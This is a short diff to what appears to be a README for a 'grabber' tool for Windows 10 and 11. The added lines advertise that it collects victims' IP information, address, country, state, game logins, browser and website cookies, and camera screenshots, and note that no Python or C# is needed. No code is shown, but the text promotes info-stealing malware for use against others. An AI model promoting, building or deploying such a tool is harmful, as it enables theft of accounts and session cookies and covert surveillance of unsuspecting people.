@@ -1,2 +1,13 @@
--- Requirements
--- Windows 10-11
+This Grabber Takes:
+-- IP Info
+-- Address
+-- Country
+-- State
+-- Game Logins
+-- Cookies
+-- Website Cookies
+-- Camera Screenshots
+
+Requirements:
+-- Windows 11/10
+-- You will Not need Python or C#/C##
